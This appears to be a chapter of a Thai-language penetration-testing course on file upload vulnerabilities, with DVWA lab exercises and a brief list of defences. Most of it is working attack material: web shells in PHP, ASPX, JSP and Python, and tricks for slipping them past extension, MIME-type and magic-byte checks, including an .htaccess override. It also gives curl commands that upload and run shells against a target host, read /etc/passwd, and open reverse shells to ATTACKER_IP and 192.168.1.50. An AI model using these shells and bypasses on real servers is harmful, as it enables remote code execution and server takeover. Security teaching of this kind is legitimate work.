# Part 28: File Upload Vulnerabilities

## สารบัญ
- [28.1 File Upload Vuln คืออะไร](#281-file-upload-vuln-คืออะไร)
- [28.2 Web Shell คืออะไร](#282-web-shell-คืออะไร)
- [28.3 เทคนิคการหลีก Filter](#283-เทคนิคการหลีก-filter)
- [28.4 Web Shell หลายภาษา](#284-web-shell-หลายภาษา)
- [28.5 Upload Shell ด้วย curl](#285-upload-shell-ด้วย-curl)
- [28.6 การป้องกัน](#286-การป้องกัน)
- [28.7 แบบฝึกหัด Lab](#287-แบบฝึกหัด-lab)

---

## 28.1 File Upload Vuln คืออะไร

File Upload Vulnerability เกิดขึ้นเมื่อ Server ไม่ตรวจสอบไฟล์ที่ Upload อย่างถูกต้อง ทำให้ผู้โจมตี Upload Web Shell แล้วเปิด Command บน Server ได้

### ผลกระทบ
```
- Remote Code Execution (RCE)
- Complete Server Takeover
- Data Exfiltration
- Lateral Movement
- Persistence
```

### ประเภทการหลีก
```
1. หลีก Extension Check
2. หลีก MIME Type Check
3. หลีก Content Check
4. Double Extension Attack
5. Null Byte Injection
6. MIME Type Spoofing
```

---

## 28.2 Web Shell คืออะไร

Web Shell คือไฟล์โปรแกรมที่จะรับคำสั่งผ่าน HTTP และรันบน Server

```php
<?php
// Simple Web Shell
echo system($_GET['cmd']);
?>

// Usage: http://target.com/uploads/shell.php?cmd=id
// Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 28.3 เทคนิคการหลีก Filter

### Bypass Extension Blacklist
```
ถ้า .php ถูกบล็อค:
  .php3, .php4, .php5, .php7, .phtml, .phar
  .PhP, .PHP (Case variation)
  shell.php.png, shell.png.php (Double extension)
  shell.php%00.png (Null byte - เก่า)
  shell.php. (จุดท้าย - Windows)
```

### Bypass MIME Type Check
```bash
# เปลี่ยน Content-Type ใน Request
curl -X POST http://target.com/upload \
  -F 'file=@shell.php;type=image/jpeg' \
  -F 'submit=Upload'

# Burp Suite: เปลี่ยน Content-Type
# Content-Disposition: form-data; name="file"; filename="shell.php"
# Content-Type: image/jpeg  ← เปลี่ยนเป็น image
```

### Bypass Magic Bytes Check
```bash
# บาง Server ตรวจ Magic Bytes (ไบต์แรกของไฟล์)
# JPEG: FF D8 FF E0
# PNG: 89 50 4E 47
# GIF: 47 49 46 38

# เพิ่ม JPEG Magic Bytes เข้าเป็น PHP Shell
printf '\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>' > shell.php

# GIF Magic Bytes
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php.gif

# Upload เป็น .gif แล้วเรียกใช้เป็น PHP
# (Server ต้อง Execute PHP ใน .gif ด้วย)
```

### Double Extension Attack
```bash
# ถ้า Server ใช้ extension สุดท้าย
shell.php.jpg  # Execute เป็น PHP? เป็น JPG?
shell.jpg.php  # สุดท้าย = PHP = สั่ง Execute PHP!

# Apache ถ้า .php ถูก disable .php5 อาจ Execute ได้
shell.php5
shell.phtml
```

### .htaccess Upload Attack
```bash
# Upload .htaccess เพื่อเปลี่ยน Handler
cat > .htaccess << 'EOF'
AddType application/x-httpd-php .jpg
EOF

# Upload .htaccess ก่อน
curl -X POST http://target.com/upload \
  -F 'file=@.htaccess;type=image/jpeg'

# แล้ว Upload shell.jpg
cat > shell.jpg << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
curl -X POST http://target.com/upload \
  -F 'file=@shell.jpg;type=image/jpeg'

# เรียกใช้
http://target.com/uploads/shell.jpg?cmd=id
```

---

## 28.4 Web Shell หลายภาษา

### PHP Web Shells
```php
<?php
// Minimal Shell
echo system($_GET['cmd']);
?>

<?php
// Basic Shell
if(isset($_REQUEST['cmd'])) {
    echo '<pre>' . shell_exec($_REQUEST['cmd']) . '</pre>';
}
?>

<?php
// B374k / Advanced Shell (ค้นหาด้วย searchsploit)
// หรือใช้ p0wnyshell
?>

<?php
// Reverse Shell via Upload
$sock = fsockopen('ATTACKER_IP', 4444);
$proc = proc_open('/bin/bash', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

### ASPX Shell (Windows IIS)
```aspx
<%@ Page Language="C#" %>
<% 
  System.Diagnostics.Process proc = new System.Diagnostics.Process();
  proc.StartInfo.FileName = "cmd.exe";
  proc.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
  proc.StartInfo.UseShellExecute = false;
  proc.StartInfo.RedirectStandardOutput = true;
  proc.Start();
  Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
%>
```

### JSP Shell (Java)
```jsp
<%
  Runtime rt = Runtime.getRuntime();
  String[] commands = {"/bin/bash", "-c", request.getParameter("cmd")};
  Process proc = rt.exec(commands);
  java.io.InputStream is = proc.getInputStream();
  java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
  out.println("<pre>" + (s.hasNext() ? s.next() : "") + "</pre>");
%>
```

### Python/CGI Shell
```python
#!/usr/bin/env python3
# shell.py (CGI Script)

import cgi
import os

print('Content-type: text/html\n')
form = cgi.FieldStorage()
cmd = form.getvalue('cmd', 'id')
print(f'<pre>{os.popen(cmd).read()}</pre>')
```

---

## 28.5 Upload Shell ด้วย curl

```bash
# Upload Shell พื้นฐาน
curl -X POST http://target.com/upload.php \
  -F 'file=@shell.php' \
  -F 'submit=Upload'

# ดู Response URL ใน Redirect
curl -X POST http://target.com/upload.php \
  -F 'file=@shell.php' \
  -F 'submit=Upload' \
  -v 2>&1 | grep 'Location\|filename\|upload'

# เรียก Shell
curl 'http://target.com/uploads/shell.php?cmd=id'
curl 'http://target.com/uploads/shell.php?cmd=cat+/etc/passwd'
curl 'http://target.com/uploads/shell.php?cmd=whoami'
curl 'http://target.com/uploads/shell.php?cmd=ls+-la+/var/www/html'

# Reverse Shell Command
curl 'http://target.com/uploads/shell.php' \
  --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/192.168.1.50/4444 0>&1"'
```

### ตั้ง Listener ก่อน
```bash
# ตั้ง netcat listener ก่อนเรียก Shell
nc -lvnp 4444

# หรือ
socat TCP-L:4444 STDOUT
```

---

## 28.6 การป้องกัน

```
1. Whitelist Extensions เท่านั้น (.jpg, .png)
2. รัน Antivirus Scan
3. Store Files นอก Web Root
4. Rename ไฟล์หลัง Upload
5. ใช้ CDN/Object Storage
6. Validate Magic Bytes
7. ไม่ Execute ไฟล์ใน Upload Directory
8. Limit File Size
```

---

## 28.7 แบบฝึกหัด Lab

### Lab 28-1: DVWA File Upload (Low Security)
```bash
# 1. Setup DVWA
docker run -d -p 8080:80 vulnerables/web-dvwa

# 2. ไปที่: http://localhost:8080/vulnerabilities/upload/
# Login: admin/password, Security: low

# 3. สร้าง Shell
echo '<?php echo system($_GET["cmd"]); ?>' > shell.php

# 4. Upload ผ่าน Browser
# หรือผ่าน curl
curl http://localhost:8080/vulnerabilities/upload/ \
  -X POST \
  -F 'uploaded=@shell.php' \
  -F 'Upload=Upload' \
  -H 'Cookie: PHPSESSID=YOUR_SESSION; security=low'

# 5. เรียกใช้
curl 'http://localhost:8080/hackable/uploads/shell.php?cmd=id'
```

### Lab 28-2: Bypass Extension Filter
```bash
# Security: Medium (Checks .php extension)

# ลองใช้ .php5
cp shell.php shell.php5
curl http://localhost:8080/vulnerabilities/upload/ \
  -X POST \
  -F 'uploaded=@shell.php5' \
  -F 'Upload=Upload' \
  -H 'Cookie: PHPSESSID=YOUR_SESSION; security=medium'
```

---

## สรุป

| เทคนิค | ใช้เมื่อ | ตัวอย่าง |
|--------|--------|--------|
| Extension bypass | Blacklist filter | .php5, .phtml |
| MIME spoof | Content-Type check | Change to image/jpeg |
| Magic bytes | File content check | Prepend GIF89a |
| Double ext | Extension split | shell.jpg.php |
| .htaccess | Apache config | AddType .jpg to PHP |

> **ความเสี่ยง:** File Upload + Execute = RCE = ควบคุม Server ได้ทั้งหมด
